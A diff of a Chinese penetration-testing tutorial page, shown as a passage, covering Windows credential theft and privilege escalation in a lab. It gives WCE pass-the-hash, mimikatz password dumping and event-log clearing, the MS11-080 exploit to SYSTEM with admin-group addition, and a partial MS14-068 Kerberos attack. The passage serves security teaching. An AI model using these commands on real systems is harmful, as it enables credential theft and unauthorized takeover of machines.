+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">C:</span>\&gt;wce-universal.exe -lv</span><br><span class="line"><span class="symbol">	001E5D92:</span><span class="string">user2:</span>ICST-<span class="string">WINATT:</span><span class="number">44</span><span class="string">EFCE164AB921CAAAD3B435B51404EE:</span><span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4</span><br><span class="line"><span class="symbol">	001B9220:</span><span class="string">test:</span>ICST-<span class="string">WINATT:</span><span class="number">44</span><span class="string">EFCE164AB921CAAAD3B435B51404EE:</span><span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4</span><br><span class="line"><span class="symbol">	0000C7CE:</span><span class="string">kevin:</span>ICST-<span class="string">WINATT:</span><span class="number">44</span><span class="string">EFCE164AB921CAAAD3B435B51404EE:</span><span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4</span><br><span class="line"><span class="symbol">	000003E4:</span>ICST-<span class="string">WINATT$:</span><span class="string">MSHOME:</span><span class="string">AAD3B435B51404EEAAD3B435B51404EE:</span><span class="number">31</span>D6CFE0D16AE931B73C59D7E0C089C0</span><br><span class="line"><span class="string">C:</span>\&gt;wce-universal.exe -i <span class="number">001E5</span>D92 -s <span class="string">kevin:</span>ICST-	<span class="string">WINATT:</span><span class="number">44</span><span class="string">EFCE164AB921CAAAD3B435B51404EE:</span><span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4</span><br><span class="line">	Changing NTLM credentials of logon session <span class="number">001E5</span>D92h <span class="string">to:</span></span><br><span class="line"><span class="symbol">	Username:</span> kevin</span><br><span class="line"><span class="symbol">	domain:</span> ICST-WINATT</span><br><span class="line"><span class="symbol">	LMHash:</span> <span class="number">44</span>EFCE164AB921CAAAD3B435B51404EE</span><br><span class="line"><span class="symbol">	NTHash:</span> <span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4</span><br><span class="line">	NTLM credentials successfully changed!</span><br><span class="line"><span class="string">C:</span>\&gt;wce-universal.exe -lv</span><br><span class="line"><span class="symbol">	001E5D92:</span><span class="string">kevin:</span>ICST-<span class="string">WINATT:</span><span class="number">44</span><span class="string">EFCE164AB921CAAAD3B435B51404EE:</span><span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4</span><br><span class="line"><span class="symbol">	001B9220:</span><span class="string">test:</span>ICST-<span class="string">WINATT:</span><span class="number">44</span><span class="string">EFCE164AB921CAAAD3B435B51404EE:</span><span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4</span><br><span class="line"><span class="symbol">	000003E4:</span>ICST-<span class="string">WINATT$:</span><span class="string">MSHOME:</span><span class="string">AAD3B435B51404EEAAD3B435B51404EE:</span><span class="number">31</span>D6CFE0D16AE931B73C59D7E0C089C0</span><br></pre></td></tr></table></figure>
+
+<ul>
 <li><p>Win7 及 之前默认 都可遭受 WCE 攻击</p>
 <ul>
 <li>防范方法：修改注册表</li>
 </ul>
-<pre><code>  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code></pre><ul>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE<span class="symbol">\S</span>YSTEM<span class="symbol">\C</span>urrentControlSet<span class="symbol">\C</span>ontrol<span class="symbol">\L</span>sa<span class="symbol">\S</span>ecurity Packages</span><br></pre></td></tr></table></figure>
+
+<ul>
 <li>删除 wdigest 之后重启计算机</li>
 </ul>
 <p><img src="https://img-blog.csdnimg.cn/20190413165146599.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
@@ -782,78 +681,25 @@
 <h5 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h5><ul>
 <li>在 kali 中的路径 /usr/share/mimikatz，将 win32 复制到 windows 主机</li>
 </ul>
-<pre><code>  C:\Win32&gt;mimikatz.exe
-  查看帮助是：：
-  mimikatz # ::
-              standard  -  Standard module  [Basic commands (does not require module name)]
-                crypto  -  Crypto Module
-              sekurlsa  -  SekurLSA module  [Some commands to enumerate credentials...]
-              kerberos  -  Kerberos package module  []
-             privilege  -  Privilege module
-               process  -  Process module
-               service  -  Service module
-               lsadump  -  LsaDump module
-                    ts  -  Terminal Server module
-                 event  -  Event module
-                  misc  -  Miscellaneous module
-                 token  -  Token manipulation module
-                 vault  -  Windows Vault/Credential module
-           minesweeper  -  MineSweeper module
-                   net  -
-                 dpapi  -  DPAPI Module (by API or RAW access)  [Data Protection application programming interface]
-             busylight  -  BusyLight Module
-                sysenv  -  System Environment Value module
-                   sid  -  Security Identifiers module
-                   iis  -  IIS XML Config module
-                   rpc  -  RPC control of mimikatz            
-  mimikatz # privilege::
-              Module :        privilege
-              Full name :     Privilege module
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">C:\Win32&gt;mimikatz.exe</span><br><span class="line">查看帮助是：：</span><br><span class="line">mimikatz # ::</span><br><span class="line">	        standard  -  Standard module  [Basic commands (does <span class="keyword">not</span> require module name)]</span><br><span class="line">	          crypto  -  Crypto Module</span><br><span class="line">	        sekurlsa  -  SekurLSA module  [Some commands <span class="keyword">to</span> enumerate credentials<span class="built_in">..</span>.]</span><br><span class="line">	        kerberos  -  Kerberos package module  []</span><br><span class="line">	       privilege  -  Privilege module</span><br><span class="line">	         process  -  Process module</span><br><span class="line">	        <span class="built_in"> service </span> - <span class="built_in"> Service </span>module</span><br><span class="line">	         lsadump  -  LsaDump module</span><br><span class="line">	              ts  -  Terminal<span class="built_in"> Server </span>module</span><br><span class="line">	           event  -  Event module</span><br><span class="line">	            misc  -  Miscellaneous module</span><br><span class="line">	           token  -  Token manipulation module</span><br><span class="line">	           vault  -  Windows Vault/Credential module</span><br><span class="line">	     minesweeper  -  MineSweeper module</span><br><span class="line">	             net  -</span><br><span class="line">	           dpapi  -  DPAPI Module (by API <span class="keyword">or</span><span class="built_in"> RAW </span>access)  [Data Protection application programming interface]</span><br><span class="line">	       busylight  -  BusyLight Module</span><br><span class="line">	          sysenv  - <span class="built_in"> System </span>Environment Value module</span><br><span class="line">	             sid  -  Security Identifiers module</span><br><span class="line">	             iis  -  IIS XML<span class="built_in"> Config </span>module</span><br><span class="line">	             rpc  -  RPC control of mimikatz			</span><br><span class="line">mimikatz # privilege::</span><br><span class="line">			Module :        privilege</span><br><span class="line">			Full name :     Privilege module</span><br><span class="line">	</span><br><span class="line">	           <span class="builtin-name">debug</span>  -  Ask <span class="builtin-name">debug</span> privilege            * *</span><br><span class="line">	          driver  -  Ask load driver privilege</span><br><span class="line">	        security  -  Ask security privilege</span><br><span class="line">	             tcb  -  Ask tcb privilege</span><br><span class="line">	          backup  -  Ask backup privilege</span><br><span class="line">	         restore  -  Ask restore privilege</span><br><span class="line">	          sysenv  -  Ask<span class="built_in"> system </span>environment privilege</span><br><span class="line">	              id  -  Ask a privilege by its id</span><br><span class="line">	            name  -  Ask a privilege by its name</span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # sekurlsa::</span><br><span class="line">mimikatz # sekurlsa::logonPasswords</span><br><span class="line">mimikatz # sekurlsa::wdigest</span><br><span class="line">mimikatz # process::list</span><br><span class="line">mimikatz # lsadump::sam</span><br><span class="line">mimikatz # lsadump::cache</span><br><span class="line">mimikatz # ts::multirdp</span><br><span class="line">mimikatz # event::clear</span><br><span class="line">mimikatz # event::drop</span><br><span class="line">mimikatz # misc::regedit</span><br><span class="line">mimikatz # token::whoami</span><br></pre></td></tr></table></figure>
 
-                 debug  -  Ask debug privilege            * *
-                driver  -  Ask load driver privilege
-              security  -  Ask security privilege
-                   tcb  -  Ask tcb privilege
-                backup  -  Ask backup privilege
-               restore  -  Ask restore privilege
-                sysenv  -  Ask system environment privilege
-                    id  -  Ask a privilege by its id
-                  name  -  Ask a privilege by its name
-  mimikatz # privilege::debug
-  mimikatz # sekurlsa::
-  mimikatz # sekurlsa::logonPasswords
-  mimikatz # sekurlsa::wdigest
-  mimikatz # process::list
-  mimikatz # lsadump::sam
-  mimikatz # lsadump::cache
-  mimikatz # ts::multirdp
-  mimikatz # event::clear
-  mimikatz # event::drop
-  mimikatz # misc::regedit
-  mimikatz # token::whoami</code></pre><h4 id="利用漏洞提权"><a href="#利用漏洞提权" class="headerlink" title="利用漏洞提权"></a>利用漏洞提权</h4><h5 id="1-使用-Ms011-080-获取-WinXP-的-SYSTEM-权限"><a href="#1-使用-Ms011-080-获取-WinXP-的-SYSTEM-权限" class="headerlink" title="1. 使用 Ms011-080 获取 WinXP 的 SYSTEM 权限"></a>1. 使用 Ms011-080 获取 WinXP 的 SYSTEM 权限</h5><ul>
+
+
+<h4 id="利用漏洞提权"><a href="#利用漏洞提权" class="headerlink" title="利用漏洞提权"></a>利用漏洞提权</h4><h5 id="1-使用-Ms011-080-获取-WinXP-的-SYSTEM-权限"><a href="#1-使用-Ms011-080-获取-WinXP-的-SYSTEM-权限" class="headerlink" title="1. 使用 Ms011-080 获取 WinXP 的 SYSTEM 权限"></a>1. 使用 Ms011-080 获取 WinXP 的 SYSTEM 权限</h5><ul>
 <li><p>Ms011-080 对应补丁 Kb2592799</p>
 <p><a href="https://technet.microsoft.com/library/security/ms11-080" target="_blank" rel="noopener">微软官网公告(https://technet.microsoft.com/library/security/ms11-080)</a></p>
 <p><img src="https://img-blog.csdnimg.cn/20190413165237322.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 </li>
 </ul>
-<pre><code> root@kali:~# searchsploit Ms11-080
-     ------------------------------------------ --------------------------------
-      Exploit Title                            |  Path
-                                               | (/usr/share/exploitdb/)
-     ------------------------------------------ --------------------------------
-     Microsoft Windows - &#39;AfdJoinLeaf&#39; Local P | exploits/windows/local/21844.rb
-     Microsoft Windows XP/2003 - &#39;afd.sys&#39; Loc | exploits/windows/local/18176.py
-     ------------------------------------------ --------------------------------
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># searchsploit Ms11-080</span></span><br><span class="line">	------------------------------------------ --------------------------------</span><br><span class="line">	 Exploit Title                            |  Path</span><br><span class="line">	                                          | (<span class="regexp">/usr/share</span><span class="regexp">/exploitdb/</span>)</span><br><span class="line">	------------------------------------------ --------------------------------</span><br><span class="line">	Microsoft Windows - <span class="string">'AfdJoinLeaf'</span> Local P | exploits/windows/local/<span class="number">21844</span>.rb</span><br><span class="line">	Microsoft Windows XP/<span class="number">2003</span> - <span class="string">'afd.sys'</span> Loc | exploits/windows/local/<span class="number">18176</span>.py</span><br><span class="line">	------------------------------------------ --------------------------------</span><br><span class="line"></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># cp /usr/share/exploitdb/exploits/windows/local/18176.py .</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将文件拷贝到 英文版 WinXP 系统(有时候中文版 XP 也可以使用)</span></span><br><span class="line"><span class="comment"># 首先查看 WinXP 是否安装了 对应更新 Kb2592799</span></span><br><span class="line">WinXP -&gt; 运行 -&gt; appwiz.cpl -&gt; 查看是否有安装 Kb2592799，有的话卸载掉</span><br></pre></td></tr></table></figure>
 
- root@kali:~# cp /usr/share/exploitdb/exploits/windows/local/18176.py .
-
- # 将文件拷贝到 英文版 WinXP 系统(有时候中文版 XP 也可以使用)
- # 首先查看 WinXP 是否安装了 对应更新 Kb2592799
- WinXP -&gt; 运行 -&gt; appwiz.cpl -&gt; 查看是否有安装 Kb2592799，有的话卸载掉</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165247833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20190413165247833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <p> 查看 WinXP下的文件路径</p>
 <p><img src="https://img-blog.csdnimg.cn/20190413165254957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <p>1.WinXP 上安装的 python 的运行环境<br>C:\Documents and Settings\kevin&gt;cd \</p>
-<pre><code>  C:\&gt;18176.py -O XP</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165302568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;<span class="number">18176.</span>py -O XP</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20190413165302568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <p>  启动任务管理器</p>
 <p><img src="https://img-blog.csdnimg.cn/20190413165311388.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <p>  结束 kevin 权限的 explorer 桌面程序</p>
@@ -863,29 +709,18 @@
 <p>  启动 system 权限的 explorer 桌面程序</p>
 <p><img src="https://img-blog.csdnimg.cn/20190413165333649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <p>2.WinXP 无需安装 Pyhon 的运行环境</p>
-<pre><code>  # 使用 python2 的 pyinstaller 将 python 文件进行打包
-  root@kali:~# apt-get install python-pip
-  root@kali:~# pip install pyinstaller
-  # 或者 WinXP 下，安装 python2.7
-  C:\&gt;pyinstaller --onefile 18176.py
-      297 INFO: Building EXE from out00-EXE.toc
-      297 INFO: Appending archive to EXE C:\dist\18176.exe
-      328 INFO: Building EXE from out00-EXE.toc completed successfully.
-</code></pre><p><img src="https://img-blog.csdnimg.cn/2019041316534468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<pre><code>  # 打开文件目录，将文件复制到目标主机
-  C:\&gt;whoami
-      test
-  C:\&gt;net user test
-      本地组成员             *Users
-      全局组成员             *None
-  # 查看文件位置</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165353673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<pre><code>     C:\&gt;cd 111
-     C:\111&gt;18176.exe -O XP</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165402710.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<pre><code>     C:\WINDOWS\system32&gt;whoami
-         SYSTEM
-     # 将自己添加为管理员组
-     C:\WINDOWS\system32&gt;net localgroup administrators test /add
-         命令成功完成。</code></pre><p>2.用 Ms11-046 时目标主机蓝屏(Dos)</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 python2 的 pyinstaller 将 python 文件进行打包</span></span><br><span class="line">root@kali:~<span class="comment"># apt-get install python-pip</span></span><br><span class="line">root@kali:~<span class="comment"># pip install pyinstaller</span></span><br><span class="line"><span class="comment"># 或者 WinXP 下，安装 python2.7</span></span><br><span class="line">C:<span class="string">\&gt;pyinstaller</span> --onefile <span class="number">18176.py</span></span><br><span class="line">	<span class="number">297</span> INFO: Building EXE <span class="keyword">from</span> out00-EXE.toc</span><br><span class="line">	<span class="number">297</span> INFO: Appending archive <span class="keyword">to</span> EXE C:<span class="string">\dist\18176.exe</span></span><br><span class="line">	<span class="number">328</span> INFO: Building EXE <span class="keyword">from</span> out00-EXE.toc completed successfully.</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/2019041316534468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 打开文件目录，将文件复制到目标主机</span></span><br><span class="line">C:\&gt;whoami</span><br><span class="line">	test</span><br><span class="line">C:\&gt;net<span class="built_in"> user </span>test</span><br><span class="line">	本地组成员             *Users</span><br><span class="line">	全局组成员             *None</span><br><span class="line"><span class="comment"># 查看文件位置</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20190413165353673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;cd <span class="number">111</span></span><br><span class="line">C:\<span class="number">111</span>&gt;<span class="number">18176.</span>exe -O XP</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20190413165402710.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\WINDOWS\system32&gt;whoami</span><br><span class="line">	SYSTEM</span><br><span class="line"><span class="comment"># 将自己添加为管理员组</span></span><br><span class="line">C:\WINDOWS\system32&gt;net localgroup administrators test /add</span><br><span class="line">	命令成功完成。</span><br></pre></td></tr></table></figure>
+
+<p>2.用 Ms11-046 时目标主机蓝屏(Dos)</p>
 <h5 id="2-Win7-使用-Ms14-068-获取-域控制器的权限"><a href="#2-Win7-使用-Ms14-068-获取-域控制器的权限" class="headerlink" title="2.Win7 使用 Ms14-068 获取 域控制器的权限"></a>2.Win7 使用 Ms14-068 获取 域控制器的权限</h5><ul>
 <li><p>使用 win2003 搭建域控制器</p>
 <ul>
@@ -898,12 +733,9 @@
 </ul>
 </li>
 </ul>
-<pre><code>     # Win2003 设置成域控制器，配置静态 IP 地址
-     # Win2003 设置强密码
-     C:\&gt;net user Administrator jlcssadmin2006...
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Win2003 设置成域控制器，配置静态 IP 地址</span></span><br><span class="line"><span class="comment"># Win2003 设置强密码</span></span><br><span class="line">C:\&gt;net<span class="built_in"> user </span>Administrator jlcssadmin2006<span class="built_in">..</span>.</span><br><span class="line"></span><br><span class="line"><span class="comment"># Win7 设置 静态 IP	并将 DNS 设置为 Win2003 的IP地址</span></span><br><span class="line"><span class="comment"># Win7 加入域控制器</span></span><br></pre></td></tr></table></figure>
 
-     # Win7 设置 静态 IP    并将 DNS 设置为 Win2003 的IP地址
-     # Win7 加入域控制器    </code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165420295.png" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20190413165420295.png" alt="在这里插入图片描述"></p>
 <p>​    <img src="https://img-blog.csdnimg.cn/20190413165426948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <p><img src="https://img-blog.csdnimg.cn/20190413165431859.png" alt="在这里插入图片描述"></p>
 <p>重启之后</p>
@@ -933,86 +765,27 @@
 <li><p>使用漏洞代码攻击域控制器</p>
 <ul>
 <li><p>获取攻击文件</p>
-<pre><code>  # root@kali:~# searchsploit Ms14-068
-      ------------------------------------------ ----------------------------------
-       Exploit Title                            |  Path
-                                | (/usr/share/                    exploitdb/)
-      ------------------------------------------ ----------------------------------
-      Microsoft Windows Kerberos - Privilege Es | exploits/windows/remote/35474.py
-      ------------------------------------------ ---------------------------------
-  root@kali:~# cp /usr/share/exploitdb/exploits/windows/remote/35474.py .</code></pre></li>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># root@kali:~# searchsploit Ms14-068</span></span><br><span class="line">	<span class="params">------------------------------------------</span> <span class="params">----------------------------------</span></span><br><span class="line">	 Exploit Title                            |  Path</span><br><span class="line">                              | <span class="params">(/usr/share/					exploitdb/)</span></span><br><span class="line">	<span class="params">------------------------------------------</span> <span class="params">----------------------------------</span></span><br><span class="line">	Microsoft Windows Kerberos - Privilege Es | exploits/windows/remote/35474.py</span><br><span class="line">	<span class="params">------------------------------------------</span> <span class="params">---------------------------------</span></span><br><span class="line">root@kali:~<span class="comment"># cp /usr/share/exploitdb/exploits/windows/remote/35474.py .</span></span><br></pre></td></tr></table></figure>
+</li>
 <li><p>域环境下使用通用工具查看本地密码</p>
 </li>
 </ul>
-<pre><code>  C:\fgdump&gt;PwDump.exe localhost    # 仅是本地密码
-  C:\&gt;wce-universal.exe    # 结果是域控制器密码
-  C:\&gt;wce-universal.exe -w
-      Administrator\LAB:jlcssadmin
-  C:\Win32&gt;mimikatz.exe
-  mimikatz # ::
-  mimikatz # privilege::debug
-      Privilege &#39;20&#39; OK
-  mimikatz # kerberos::list
-  mimikatz # sekurlsa::logonPasswords</code></pre><ul>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:<span class="string">\fgdump&gt;PwDump.exe</span> localhost	<span class="comment"># 仅是本地密码</span></span><br><span class="line">C:<span class="string">\&gt;wce-universal.exe</span>	<span class="comment"># 结果是域控制器密码</span></span><br><span class="line">C:<span class="string">\&gt;wce-universal.exe</span> -w</span><br><span class="line">	Administrator<span class="string">\LAB:jlcssadmin</span></span><br><span class="line">C:<span class="string">\Win32&gt;mimikatz.exe</span></span><br><span class="line">mimikatz <span class="comment"># ::</span></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line">	Privilege <span class="string">'20'</span> OK</span><br><span class="line">mimikatz <span class="comment"># kerberos::list</span></span><br><span class="line">mimikatz <span class="comment"># sekurlsa::logonPasswords</span></span><br></pre></td></tr></table></figure>
+
+<ul>
 <li>漏洞利用过程</li>
 </ul>
-<pre><code>  1. 首先在 kali 通过脚本生成一个票据文件
-      # ms14-068.py -u user@lab.com -s userSID -d dc.lab.com
-      -u 用户名:登录用户名
-      -s userSID
-      -d 域控制器名称：在 Win7 计算机名称处查看，不在域控是，可以用IP地址代替
-  2. 将票据文件拷贝到 win 系统里
-      # 拷贝 TGT_user1@lab.com.ccache 到windows系统
-  3. 在 win 系统里使用 mimikatz.exe 完成权限的提升
-      # mimikatz.exe log &quot;kerberos::ptc TGT_user@lab.com.ccache&quot; exit
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 首先在 kali 通过脚本生成一个票据文件</span><br><span class="line">	# ms14<span class="number">-068.</span>py -u <span class="symbol">user@</span>lab.com -s userSID -d dc.lab.com</span><br><span class="line">	-u 用户名:登录用户名</span><br><span class="line">	-s userSID</span><br><span class="line">	-d 域控制器名称：在 Win7 计算机名称处查看，不在域控是，可以用IP地址代替</span><br><span class="line"><span class="number">2.</span> 将票据文件拷贝到 win 系统里</span><br><span class="line">	# 拷贝 <span class="symbol">TGT_user1@</span>lab.com.ccache 到windows系统</span><br><span class="line"><span class="number">3.</span> 在 win 系统里使用 mimikatz.exe 完成权限的提升</span><br><span class="line">	# mimikatz.exe log <span class="string">"kerberos::ptc TGT_user@lab.com.ccache"</span> exit</span><br><span class="line">  </span><br><span class="line"># 在 Win7 上使用本地用户登录</span><br><span class="line"># 查看域账号的信息</span><br><span class="line">C:\&gt;net user</span><br><span class="line">	\\WIN7-VM 的用户帐户</span><br><span class="line">	Administrator            Guest                    John</span><br><span class="line">	user1                    user2</span><br><span class="line">	命令成功完成。</span><br><span class="line">C:\Win32&gt;whoami.exe /all</span><br><span class="line">	[User]     = <span class="string">"LAB\user3"</span>  S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-3056505427</span><span class="number">-3800332898</span><span class="number">-2304591883</span><span class="number">-1111</span></span><br><span class="line"></span><br><span class="line"># kali 报错缺少模块</span><br><span class="line"><span class="symbol">root@</span>kali:~# python <span class="number">35474.</span>py -u <span class="symbol">user3@</span>lab.com -s S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-3056505427</span><span class="number">-3800332898</span><span class="number">-2304591883</span><span class="number">-1111</span> -d <span 